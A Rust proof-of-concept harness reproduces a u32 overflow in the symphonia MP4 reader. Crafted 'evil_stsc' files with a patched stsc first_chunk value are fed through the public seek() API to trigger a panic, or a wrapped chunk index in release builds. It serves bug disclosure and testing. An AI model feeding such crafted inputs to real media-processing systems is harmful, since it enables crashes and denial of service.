//! Reproduces ISOMP4_STSC_FIRST_CHUNK_PLUS_CHUNK_IN_GROUP_U32_OVERFLOW.
//!
//! `MoovSegment::sample_data` (`symphonia-format-isomp4/src/stream.rs:416`) computes
//!
//!     let chunk_in_stream = group.first_chunk + chunk_in_group;
//!
//! as unchecked `u32` arithmetic. `group.first_chunk` is `first_chunk_raw - 1` read straight out
//! of the untrusted `stsc` table (`atoms/stsc.rs:71`), validated only to be `>= 1` and monotonic
//! across entries - it is never bounded against the number of chunks actually present in
//! `stco`/`co64`, so it can be as large as `0xFFFFFFFE`. `chunk_in_group` is
//! `sample_in_group / samples_per_chunk`, which grows with the requested sample index.
//!
//! The assets are real, valid ffmpeg-produced AAC-in-MP4 files whose single `stsc` entry was
//! binary-patched to `{first_chunk: 0xFFFFFFFF or 0xFFFFFFFE, samples_per_chunk: 1}` (see
//! `craft_assets.py`). They are opened and seeked exclusively through this crate's real public
//! API - `IsoMp4Reader::try_new` and `FormatReader::seek` - exactly what any caller of the crate
//! does with an untrusted file.
//!
//! `next_packet()` alone is not enough to reach the overflow: sample 0 already maps to chunk
//! `0xFFFFFFFE`, which `get_chunk_offset` rejects with a clean
//! `DecodeError("isomp4: missing stco entry")` (it bounds-checks with `.get()`), so packet
//! iteration stops before the sample index grows. The real `seek()` path reaches it directly,
//! because `seek_track_by_ts` looks up an arbitrary sample number from `stts` and hands it to
//! `sample_data`.
use std::fs::File;
use std::panic::{self, AssertUnwindSafe};
use std::process::ExitCode;

use symphonia_core::formats::{FormatOptions, FormatReader, SeekMode, SeekTo};
use symphonia_core::io::MediaSourceStream;
use symphonia_format_isomp4::IsoMp4Reader;

/// Open `path` with the real public reader, read one packet, then seek to `ts`.
fn open_and_seek(path: &str, ts: u64) {
    let file = File::open(path).unwrap_or_else(|e| panic!("failed to open {path}: {e}"));
    let mss = MediaSourceStream::new(Box::new(file), Default::default());

    let mut reader = IsoMp4Reader::try_new(mss, FormatOptions::default())
        .expect("IsoMp4Reader::try_new should accept the file - stsc::read only checks that \
                 first_chunk >= 1 and is monotonic, never that it is within the stco range");

    let track_id = reader.tracks()[0].id;

    let first = reader.next_packet().map(|p| p.map(|p| (p.pts, p.dur)));
    println!("    next_packet()      -> {first:?}");

    // seek_track_by_ts -> stts.find_sample_for_timestamp -> MoovSegment::sample_data(sample_num).
    let seeked = reader.seek(
        SeekMode::Accurate,
        SeekTo::Timestamp { ts: ts.try_into().unwrap(), track_id },
    );
    println!("    seek(ts={ts}) -> {seeked:?}");
}

fn main() -> ExitCode {
    // Each sample is 1024 timescale units long (stts), and samples_per_chunk == 1 in the crafted
    // stsc entries, so ts == 1024 * N selects sample N, which selects chunk group index N.
    let cases: &[(&str, u64, &str)] = &[
        (
            "assets/base.m4a",
            2048,
            "control: pristine unmodified file, must behave normally",
        ),
        (
            "assets/evil_stsc.mp4",
            1024,
            "first_chunk=0xFFFFFFFF (0xFFFFFFFE internally), sample 1 -> 0xFFFFFFFE + 1, \
             no overflow yet",
        ),
        (
            "assets/evil_stsc.mp4",
            2048,
            "first_chunk=0xFFFFFFFF (0xFFFFFFFE internally), sample 2 -> 0xFFFFFFFE + 2 OVERFLOWS",
        ),
        (
            "assets/evil_stsc_v2.mp4",
            2048,
            "first_chunk=0xFFFFFFFE (0xFFFFFFFD internally), sample 2 -> 0xFFFFFFFD + 2 == u32::MAX, \
             no overflow yet",
        ),
        (
            "assets/evil_stsc_v2.mp4",
            3072,
            "first_chunk=0xFFFFFFFE (0xFFFFFFFD internally), sample 3 -> 0xFFFFFFFD + 3 OVERFLOWS",
        ),
    ];

    println!(
        "build: debug_assertions={} (the overflow only panics when overflow checks are on; \
         in a release build it silently wraps to a bogus in-range chunk index instead)\n",
        cfg!(debug_assertions)
    );

    let mut panicked = Vec::new();

    for (path, ts, note) in cases {
        println!("=== {path} @ ts={ts}");
        println!("    {note}");
        let outcome = panic::catch_unwind(AssertUnwindSafe(|| open_and_seek(path, *ts)));
        if outcome.is_err() {
            println!("    => PANICKED");
            panicked.push(format!("{path} @ ts={ts}"));
        }
        else {
            println!("    => no panic");
        }
        println!();
    }

    if panicked.is_empty() {
        println!("BUG NOT REPRODUCED: no case panicked");
        ExitCode::SUCCESS
    }
    else {
        println!("BUG REPRODUCED: {} of {} cases panicked:", panicked.len(), cases.len());
        for case in &panicked {
            println!("  - {case}");
        }
        ExitCode::FAILURE
    }
}
